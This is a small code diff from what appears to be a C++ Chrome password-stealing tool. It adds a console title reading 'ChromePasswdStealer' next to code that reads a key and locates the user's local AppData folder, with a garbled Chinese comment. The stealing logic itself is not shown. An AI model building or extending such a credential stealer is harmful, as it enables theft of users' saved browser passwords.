@@ -62,6 +62,7 @@ string getKey(const char* path) {
 }
 
 int main() {
+    SetConsoleTitleA("ChromePasswdStealer");
     //»ñÈ¡Â·¾¶
     char szPath[MAX_PATH];
     SHGetFolderPathA(0, CSIDL_LOCAL_APPDATA, 0, 0, szPath);
